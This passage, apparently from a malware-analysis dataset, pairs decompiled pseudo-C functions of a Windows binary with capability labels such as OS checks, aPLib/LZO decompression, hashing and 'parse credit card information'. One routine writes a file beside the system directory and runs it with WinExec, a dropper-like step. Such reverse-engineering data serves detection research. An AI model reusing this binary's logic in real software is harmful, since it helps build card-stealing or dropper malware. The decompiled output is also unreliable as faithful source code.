            "check OS version/55c4336dbd964ae3be35b3597c99c1c2",
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint32_t __cdecl fcn.00403fd0(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    code *pcVar1;\n    uint8_t uVar2;\n    unkuint3 Var4;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    uint32_t uVar5;\n    int32_t unaff_EBX;\n    int32_t iVar6;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    char in_AF;\n    uint var_314h;\n    uint var_210h;\n    uint lpBuffer;\n    uint32_t var_8h;\n    uchar var_4h [3];\n    uint var_1h;\n    uint32_t uVar3;\n    \n    var_8h = 0;\n    iVar6 = unaff_EBX;\n    if (arg_14h != 0) {\n        do {\n            Var4 = var_8h / arg_ch >> 8;\n            uVar2 = *(var_8h + arg_10h) ^ *(var_8h % arg_ch + arg_8h);\n            uVar3 = CONCAT31(Var4, uVar2);\n            if ((uVar2 != 0) && (uVar2 == 0)) {\n                iVar6 = iVar6 + 1;\n                if (iVar6 == 0) {\n                    fcn.00401810(CONCAT13(unaff_ESI, unaff_EDI >> 8), CONCAT13(unaff_EBX, unaff_ESI >> 8), \n                                 CONCAT13(var_8h, unaff_EBX >> 8));\n                    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n                    _var_4h = 0;\n                    goto code_r0x004040ba;\n                }\n                uVar3 = (Var4 & 0xffff00) << 8 | CONCAT11((var_8h / arg_ch >> 8) + in_AF, in_AF * '\\x06') & 0xff0f;\n                *(uVar3 + 0x2a) = *(uVar3 + 0x2a) - iVar6;\n            }\n            uVar5 = var_8h + 1;\n            *(var_8h + arg_10h) = uVar3;\n            var_8h = uVar5;\n        } while (uVar5 < arg_14h);\n    }\n    return arg_14h;\ncode_r0x004040ba:\n    do {\n        arg_ch_00 = fcn.00404440();\n        arg_ch_01 = fcn.00404440();\n        arg_ch_02 = fcn.00404440();\n        fcn.00403280(arg_10h, arg_ch_00);\n        fcn.00403280(arg_8h, arg_ch_01);\n        fcn.00403280(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)();\n        iVar6 = fcn.00403a40(&var_314h);\n        if (iVar6 != 0) {\n            (*pcVar1)();\n            iVar6 = fcn.00403a40(&var_210h);\n            if (iVar6 != 0) {\n                (*pcVar1)();\n                iVar6 = fcn.00403a40(&var_210h);\n                if (iVar6 != 0) {\n                    var_8h = 1;\n                    break;\n                }\n            }\n        }\n        _var_4h = _var_4h + 1;\n    } while (_var_4h < 3);\n    fcn.00403280(arg_14h, 4);\n    return var_8h != 0;\n}\n",
        "token_count": 900
    },
    "004044d0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t fcn.004044d0(void)\n\n{\n    int32_t iVar1;\n    uint uStack12;\n    uint32_t uStack8;\n    uchar auStack4 [4];\n    \n    uStack12 = 4;\n    iVar1 = fcn.004034e0(0x80000002, 0x420574, 0x4205c0, auStack4, &uStack8, &uStack12);\n    if ((iVar1 == 0) || (5 < uStack8)) {\n        uStack8 = 0xffffffff;\n    }\n    return uStack8;\n}\n",
        "token_count": 134
    },
    "004035a0": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nuint32_t fcn.004035a0(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    uint auStack24 [4];\n    uint uStack8;\n    uint uStack4;\n    \n    (*_sym.imp.MSVCRT.dll__strlwr)(param_1);\n    pcVar1 = _sym.imp.SHLWAPI.dll_StrStrA;\n    auStack24[0] = 0x420644;\n    auStack24[1] = 0x420650;\n    auStack24[2] = 0x42065c;\n    auStack24[3] = 0x420664;\n    uStack8 = 0x420670;\n    uStack4 = 0x42067c;\n    uVar3 = 0;\n    puVar4 = auStack24;\n    do {\n        iVar2 = (*pcVar1)(param_1, *puVar4);\n        if (iVar2 != 0) {\n            return uVar3;\n        }\n        uVar3 = uVar3 + 1;\n        puVar4 = puVar4 + 1;\n    } while (uVar3 < 6);\n    return 0xffffffff;\n}\n",
        "token_count": 281
    },
    "00401310": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401420) overlaps instruction at (ram,0x0040141f)\n// \n\nvoid __cdecl fcn.00401310(uint *arg_8h, uint32_t arg_ch, uint arg_10h, uint *arg_14h)\n\n{\n    uint8_t *puVar1;\n    uint16_t uVar2;\n    uint *puVar3;\n    uint8_t extraout_CL;\n    uint32_t uVar4;\n    uint *puVar5;\n    uint *unaff_EDI;\n    bool bVar6;\n    char cVar7;\n    char cVar8;\n    uint *puVar9;\n    uint *puVar10;\n    \n    puVar10 = unaff_EDI;\n    uVar2 = fcn.00401870(0, arg_8h, arg_ch + 1 >> 1);\n    uVar4 = uVar2;\n    cVar8 = '\\0';\n    cVar7 = '\\0';\n    bVar6 = ((unaff_EDI | 0x74e3) - uVar2 & 0x1a8) == 0;\n    puVar9 = arg_8h;\n    puVar3 = (*_sym.imp.dbghelp.dll_ImageNtHeader)();\n    if ((bVar6 || cVar8 != cVar7) || (!bVar6 && cVar8 == cVar7)) {\n        unaff_EDI = puVar3[0x16];\n    }\n    else {\n        arg_8h = arg_8h + 1;\n        cVar7 = arg_8h;\n        puVar1 = puVar3 + -0x74c625aa;\n        *puVar1 = *puVar1 ^ extraout_CL;\n        if (*puVar1 < '\\0') {\n            *(uVar4 + 0x3b) = *(uVar4 + 0x3b) + (puVar3 >> 8);\n            LOCK();\n            goto code_r0x004013cc;\n        }\n    }\n    cVar7 = arg_8h;\n    if (uVar2 < unaff_EDI) {\n        uVar4 = (uVar4 - unaff_EDI & 0xffff) - 1;\n    }\n    else {\n        uVar4 = uVar4 - (unaff_EDI & 0xffff);\n    }\ncode_r0x004013cc:\n    if (uVar4 < unaff_EDI >> 0x10) {\n        uVar4 = (uVar4 - (unaff_EDI >> 0x10) & 0xffff) - 1;\n    }\n    else {\n        uVar4 = uVar4 - (unaff_EDI >> 0x10);\n    }\n    *arg_14h = uVar4 + arg_ch;\n    if ((SCARRY4(uVar4, arg_ch)) || (puVar5 = uVar4 + arg_ch,  !SCARRY4(uVar4, arg_ch))) {\n        arg_14h = puVar3;\n        puVar5 = puVar10;\n        unaff_EDI = puVar9;\n    }\n    *unaff_EDI = *puVar5;\n    *(unaff_EDI + 0x62) = *(unaff_EDI + 0x62) + cVar7 + CARRY4(uVar4, arg_ch);\n    *0x8b08458b = *(arg_14h + 0x59);\n    return;\n}\n",
        "token_count": 760
    },
    "00401870": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498",
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl fcn.00401870(uint32_t arg_8h, uint16_t *arg_ch, int32_t arg_10h)\n\n{\n    if (arg_10h == 0) {\n        return (arg_8h >> 0x10) + arg_8h;\n    }\n    do {\n        arg_8h = arg_8h + *arg_ch;\n        if (arg_8h >> 0x10 != 0) {\n            arg_8h = (arg_8h >> 0x10) + (arg_8h & 0xffff);\n        }\n        arg_ch = arg_ch + 1;\n        arg_10h = arg_10h + -1;\n    } while (arg_10h != 0);\n    return (arg_8h >> 0x10) + arg_8h;\n}\n",
        "token_count": 205
    },
    "00401aa0": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401afa) overlaps instruction at (ram,0x00401af8)\n// \n\nuint fcn.00401aa0(uint param_1)\n\n{\n    ushort uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint *puVar4;\n    char cVar5;\n    int32_t iVar6;\n    uint8_t extraout_CH;\n    uint *puVar7;\n    uint16_t uVar8;\n    uint *puVar9;\n    uint *puVar10;\n    uint16_t unaff_DI;\n    uchar uVar11;\n    bool bVar12;\n    ulong uVar13;\n    uint *apuStack92 [3];\n    uint32_t uStack80;\n    uint uStack76;\n    int32_t iStack72;\n    uint uStack68;\n    uint uStack64;\n    int32_t iStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint uStack8;\n    \n    uVar8 = *0x10 - 4;\n    puStack52 = &stack0xfffffff8;\n    uStack56 = param_1;\n    uStack8 = 0;\n    iStack60 = 0x401abb;\n    iStack60 = sub.VERSION.dll_GetFileVersionInfoSizeA();\n    if (iStack60 != 0) {\n        uStack64 = 2;\n        uStack68 = 0x401ad2;\n        (*_sym.imp.KERNEL32.dll_GlobalAlloc)();\n        uStack76 = CONCAT22(*0x10 + -0x40, uVar8);\n        uStack80 = unaff_DI;\n        bVar12 = (extraout_CH | 0x47) < '\\0';\n        uVar11 = (extraout_CH | 0x47) == 0;\n        puVar9 = &stack0xfffffffc & 0xffff0000 | uVar8;\n        uVar2 = puVar9[-4];\n        iStack72 = 0x401aea;\n        uStack68 = uVar2;\n        uVar13 = (*_sym.imp.KERNEL32.dll_GlobalLock)();\n        uStack76 = uVar13 >> 0x20;\n        iVar6 = uVar13;\n        if ((bVar12) || (!bVar12)) {\n            uStack76 = puVar9[-5];\n            uStack80 = puVar9[-1];\n        }\n        else {\n            uStack80 = iVar6 + -0x7413aa75;\n            puVar9 = puVar9 + 1;\n            uVar11 = puVar9 == NULL;\n        }\n        apuStack92[2] = puVar9[2];\n        apuStack92[1] = 0x401b0c;\n        iStack72 = iVar6;\n        sub.VERSION.dll_GetFileVersionInfoA();\n        puVar10 = puVar9;\n        if ((!uVar11) && (uVar11)) {\n            puVar7 = &stack0xffffffa8;\n            puVar10 = &stack0xffffffa8;\n            cVar5 = '\\x10';\n            puVar4 = puVar9;\n            do {\n                puVar4 = puVar4 + -1;\n                puVar7 = puVar7 + -1;\n                *puVar7 = *puVar4;\n                cVar5 = cVar5 + -1;\n                apuStack92[1] = puVar9;\n            } while ('\\0' < cVar5);\n        }\n        sub.VERSION.dll_VerQueryValueA(iVar6, 0x406010, puVar10 + -2, puVar10 + -3);\n        iVar6 = puVar10[-2];\n        uVar3 = *(iVar6 + 0x10);\n        *(puVar10 + -0x1e) = *(iVar6 + 0x10);\n        uVar1 = *(iVar6 + 0x14);\n        *(puVar10 + -8) = uVar3 >> 0x10;\n        uVar3 = *(iVar6 + 0x14);\n        *(puVar10 + -0x1a) = uVar1;\n        *(puVar10 + -7) = uVar3 >> 0x10;\n        (*_sym.imp.MSVCRT.dll_sprintf)\n                  (puVar10[3], 0x420850, puVar10[-8] & 0xffff, *(puVar10 + -0x1e) & 0xffff, puVar10[-7] & 0xffff, \n                   *(puVar10 + -0x1a) & 0xffff);\n        (*_sym.imp.KERNEL32.dll_GlobalUnlock)(uVar2);\n        (*_sym.imp.KERNEL32.dll_GlobalFree)(uVar2);\n    }\n    return 1;\n}\n",
        "token_count": 1042
    },
    "00401430": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00401430(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    uint8_t uVar1;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_10h._0_1_ = arg_14h * '\\x02';\n    var_8h = 0;\n    if (0 < arg_14h) {\n        var_ch = 1;\n        do {\n            uVar1 = *(var_ch % arg_ch + arg_8h);\n            *(arg_18h + -1 + var_ch) = var_10h ^ *(var_8h + arg_10h) ^ *((var_ch + -1) % arg_ch + arg_8h);\n            *(var_ch + arg_18h) = var_10h ^ uVar1;\n            var_8h = var_8h + 1;\n            var_ch = var_ch + 2;\n        } while (var_8h < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 307
    },
    "00402590": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681",
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402896) overlaps instruction at (ram,0x00402893)\n// \n\nvoid __fastcall fcn.00402590(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    char *pcVar2;\n    uint16_t uVar3;\n    uint32_t uVar4;\n    uint8_t *puVar5;\n    ushort extraout_CX;\n    char extraout_CH;\n    char extraout_CH_00;\n    uint32_t extraout_ECX;\n    uint32_t extraout_ECX_00;\n    uint32_t extraout_ECX_01;\n    ushort extraout_DX;\n    int32_t extraout_EDX;\n    char cVar6;\n    uint32_t unaff_EBX;\n    char *pcVar7;\n    char unaff_BP;\n    uint16_t uVar8;\n    uint *unaff_ESI;\n    uint *puVar9;\n    uint *puVar10;\n    uint *unaff_EDI;\n    uint *puVar11;\n    ushort in_ES;\n    uchar in_CF;\n    uint8_t in_AF;\n    bool in_ZF;\n    uchar uVar12;\n    bool bVar13;\n    char in_SF;\n    char in_OF;\n    bool bVar14;\n    float10 fVar15;\n    ulong uVar16;\n    ushort uVar17;\n    uint in_stack_ffffffd8;\n    uchar uVar18;\n    uint in_stack_ffffffdc;\n    unkbyte3 Var19;\n    uint uVar20;\n    uint8_t uVar21;\n    uchar uVar22;\n    \n    if ((!in_ZF && in_OF == in_SF) && (in_ZF || in_OF != in_SF)) {\n        if (param_1 != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        fcn.00401790(0x420374, 0xb, unaff_EDI, unaff_ESI);\n        fcn.00401790(0x420374, 0xb, 0x42070c, 0x4b);\n        fcn.00401790(0x420374, 0xb, 0x420758, 0x39);\n        fcn.00401790(0x420374, 0xb, 0x420794, 8);\n        fcn.00401790(0x420374, 0xb, 0x42079c, 0x14);\n        return;\n    }\n    uVar16 = fcn.00401790(0x420374, 0xb, 0x420380, 0x11);\n    uVar20 = uVar16 >> 0x20;\n    if ((in_CF) || (!in_CF)) {\n        uVar20 = 0x10;\n        in_stack_ffffffdc = 0x4205e0;\n        in_stack_ffffffd8 = 0xb;\n    }\n    *(unaff_ESI + 0x43d1773a) = *(unaff_ESI + 0x43d1773a) ^ 0x6a27e95e;\n    pcVar7 = uVar16 + (in_CF == false) + 0x7c8ecaed;\n    *pcVar7 = *pcVar7 + extraout_CH;\n    uVar17 = 0x42;\n    fcn.00401790(0x420374, in_stack_ffffffd8, in_stack_ffffffdc, uVar20);\n    pcVar7 = (unaff_EBX >> 8 & 0xffff00) << 8 | unaff_EBX & 0xffff;\n    fcn.00401790(0x420374, 0xb, 0x4205f0, 0x1a);\n    bVar14 = SCARRY1((unaff_EBX & 0xffff) >> 8, '0');\n    fcn.00401790(0x420374, 0xb, 0x420644, 10);\n    if ((bVar14) || (!bVar14)) {\n        in_stack_ffffffdc = 0x420650;\n        in_stack_ffffffd8 = 0xb;\n    }\n    puVar11 = unaff_EDI + 1;\n    puVar9 = unaff_ESI + 1;\n    *unaff_EDI = *unaff_ESI;\n    *0x50680b76 = *0x50680b76 + extraout_CH_00;\n    fcn.00401790(0x420374, CONCAT22(uVar17, in_ES), in_stack_ffffffd8, in_stack_ffffffdc);\n    bVar14 = extraout_ECX < 0x5354;\n    uVar12 = extraout_ECX == 0x5354;\n    uVar18 = 0xb;\n    uVar22 = 0;\n    uVar4 = fcn.00401790(0x420374, 0xb, 0x42065c, 8);\n    if ((!uVar12) && (uVar12)) {\n        pcVar7 = pcVar7 + 1;\n        if (bVar14 || pcVar7 == NULL) goto code_r0x004026e9;\n        in_AF = 9 < (uVar4 & 0xf) | in_AF;\n        piVar1 = (uVar4 & 0xffff0000 | CONCAT11((uVar4 >> 8) + in_AF, uVar4 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n        *piVar1 = *piVar1 - pcVar7;\n        puVar9 = unaff_ESI + 5;\n        uVar12 = puVar9 == NULL;\n    }\n    fcn.00401790(0x420374, 0xb, 0x420664, 9);\n    puVar10 = puVar9;\n    if ((!uVar12) && (uVar12)) {\n        puVar10 = puVar9 + 1;\n        out(*puVar9, extraout_DX);\n    }\n    fcn.00401790(0x420374, 0xb, 0x420670, 9);\n    uVar18 = SUB41(puVar10, 0);\n    uVar22 = puVar10 >> 8;\ncode_r0x004026e9:\n    uVar8 = CONCAT11(uVar22, uVar18);\n    fcn.00401790(0x420374, 0xb, 0x42067c, 9);\n    fcn.00401790(0x420374, 0xb, 0x420688, 0xc);\n    uVar3 = puVar11 + 0x2562;\n    uVar4 = uVar3 & 0xffffff00 | uVar3 | 0x4c | extraout_ECX_00;\n    uVar12 = uVar4 < 0;\n    bVar14 = uVar4 == 0;\n    fcn.00401790(0x420374, 0xb, 0x4207b0, 3);\n    if ((!bVar14) && (bVar14)) {\n        uVar12 = &stack0xffffffe1 < 0;\n    }\n    uVar4 = 0;\n    Var19 = 10;\n    uVar18 = 0;\n    uVar20 = 0x4207b400;\n    fcn.00401790(0x420374, 0xb, 0x4207b4, 10);\n    fVar15 = fcn.00401790(0x420374, 0xb, 0x4207c0, 0x1b);\n    if ((!uVar12) && (uVar12)) {\n        *(unaff_EDI + 8) = fVar15;\n        puVar11 = unaff_EDI + 9;\n        uVar8 = uVar8 + 5;\n    }\n    fcn.00401790(0x420374, 0xb, 0x4207dc, 0x12);\n    bVar14 = false;\n    bVar13 = (((pcVar7 ^ uVar8) >> 8) - 1U & 0xd) == 0;\n    uVar4 = uVar4 & 0xff | 0x4027ec00;\n    uVar12 = 0;\n    uVar16 = fcn.00401790(0x420374, 0xb, 0x4207f0, 0x40);\n    if ((bVar14 || bVar13) || (!bVar14 && !bVar13)) {\n        uVar12 = 0;\n        uVar4 = 0xc00;\n        uVar20 = 0xb00;\n        Var19 = 0x420830;\n        uVar18 = 0;\n    }\n    cVar6 = *pcVar7;\n    *(puVar11 + 0x6a) = *(puVar11 + 0x6a) - &stack0xffffffd9;\n    puVar5 = uVar16 | 0x68;\n    *puVar5 = *puVar5 ^ extraout_CX;\n    pcVar2 = (uVar16 >> 0x20) + 0xc;\n    *pcVar2 = *pcVar2 + ((extraout_CX >> 8) - cVar6);\n    fcn.00401790(0x420374, CONCAT13(uVar18, uVar20 >> 8), CONCAT13(uVar4, Var19), CONCAT13(uVar12, uVar4 >> 8));\n    fcn.00401790(0x420374, 0xb, 0x42083c, 0xb);\n    uVar4 = fcn.00401790(0x420374, 0xb, 0x420848, 4);\n    bVar14 = uVar4 < 0x6e32;\n    cVar6 = pcVar7;\n    uVar12 = 0x74;\n    uVar17 = 0x4203;\n    uVar18 = 0;\n    uVar16 = fcn.00401790(0x420374, 0xb, 0x42084c, 4);\n    puVar5 = uVar16 >> 0x20;\n    uVar4 = uVar16;\n    if ((bVar14) || (!bVar14)) {\n        uVar4 = 0xc;\n        uVar21 = 0;\n    }\n    else {\n        puVar11 = puVar11 ^ *(puVar11 + 0xe58be73);\n        cVar6 = unaff_BP + 'v';\n        uVar21 = uVar16 >> 0x18;\n        *puVar5 = *puVar5 | uVar16;\n    }\n    fcn.00401790(0x420374, 0xb, uVar4 & 0xffffff | uVar21 << 0x18, CONCAT13(uVar18, CONCAT21(uVar17, uVar12)));\n    fcn.00401790(0x420374, 0xb, 0x42085c, 4);\n    bVar14 = (extraout_ECX_01 & 0xffff0000 | CONCAT11((extraout_ECX_01 >> 8) - cVar6, extraout_ECX_01)) - extraout_EDX <\n             0;\n    fVar15 = fcn.00401790(0x420374, 0xb, 0x420860, 9);\n    if ((!bVar14) && (bVar14)) {\n        *(puVar11 + 7) = fVar15;\n    }\n    fcn.00401790(0x420374, 0xb, 0x42086c, 0x16);\n    fcn.00401790(0x420374, 0xb, 0x420884, 7);\n    return;\n}\n",
        "token_count": 2640
    },
    "004049c0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.004049c0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.00403280(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x4207b4, acStack1304, &uStack2112);\n    uStack2088 = 0x42086c;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x420884;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.00404880(auStack1564, 0x4207b0, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1848
    },
    "00401910": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401a79) overlaps instruction at (ram,0x00401a70)\n// \n// WARNING: Removing unreachable block (ram,0x00401a45)\n// WARNING: Removing unreachable block (ram,0x00401ab9)\n// WARNING: Removing unreachable block (ram,0x00401ac6)\n// WARNING: Removing unreachable block (ram,0x00401af2)\n// WARNING: Removing unreachable block (ram,0x00401afa)\n// WARNING: Removing unreachable block (ram,0x00401af8)\n// WARNING: Removing unreachable block (ram,0x00401b00)\n// WARNING: Removing unreachable block (ram,0x00401b0e)\n// WARNING: Removing unreachable block (ram,0x00401b17)\n// WARNING: Removing unreachable block (ram,0x00401b1b)\n// WARNING: Removing unreachable block (ram,0x00401be1)\n// WARNING: Removing unreachable block (ram,0x00401a4f)\n\nuint __fastcall\nfcn.00401910(uint param_1, uint8_t param_2, uint param_3, uint param_4, uint param_5, uint param_6, uint param_7, \n            int32_t param_8)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    char cVar3;\n    uint32_t in_EAX;\n    uint8_t *puVar4;\n    int32_t iVar5;\n    int32_t extraout_ECX;\n    uint extraout_EDX;\n    uint uVar6;\n    int32_t unaff_EBX;\n    uint8_t **arg_20h;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint8_t **ppuVar9;\n    uint *unaff_EDI;\n    uint *puVar10;\n    code *pcVar11;\n    uint8_t **ppuVar12;\n    bool bVar13;\n    uint8_t in_AF;\n    bool bVar14;\n    bool bVar15;\n    float10 in_ST0;\n    float10 extraout_ST0;\n    float10 extraout_ST0_00;\n    uchar uStack36;\n    uint uStack35;\n    uint uStack20;\n    uchar uStack5;\n    \n    bVar14 = (param_2 & unaff_EBX) != 0;\n    if ((bVar14) && (!bVar14)) {\n        arg_20h = unaff_EBX + 1;\n        if (arg_20h == NULL) goto code_r0x00401991;\n        uVar2 = 9 < (in_EAX & 0xf) | in_AF;\n        piVar1 = (in_EAX & 0xffff0000 | CONCAT11((in_EAX >> 8) + uVar2, in_EAX + uVar2 * '\\x06') & 0xff0f) + 0x2a;\n        *piVar1 = *piVar1 - arg_20h;\n    }\n    arg_20h = fcn.00403cc0(param_7, param_8, 0x4203c4, 7);\n    in_ST0 = extraout_ST0;\n    if (arg_20h == NULL) {\n        return 0;\n    }\ncode_r0x00401991:\n    uStack36 = 0;\n    puVar10 = &uStack36 + 1;\n    for (iVar5 = 7; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    *puVar10 = 0;\n    *(puVar10 + 2) = 0;\n    uVar7 = 0;\n    bVar14 = false;\n    pcVar11 = _sym.imp.MSVCRT.dll_rand;\n    do {\n        uVar8 = uVar7;\n        if ((!bVar14) && (bVar14)) {\n            *(pcVar11 + 0x1c) = in_ST0;\n            pcVar11 = pcVar11 + 5;\n            uVar8 = uVar7 + 5;\n        }\n        uVar7 = (*pcVar11)();\n        puVar4 = uVar7 & 0x800000ff;\n        if (puVar4 < 0) {\n            puVar4 = (puVar4 + -1 | 0xffffff00) + 1;\n        }\n        (&uStack36)[uVar8] = puVar4;\n        uVar7 = uVar8 + 1;\n        bVar13 = uVar7 < 0x20;\n        bVar15 = SBORROW4(uVar7, 0x20);\n        bVar14 = uVar8 - 0x1f < 0;\n        in_ST0 = extraout_ST0_00;\n    } while 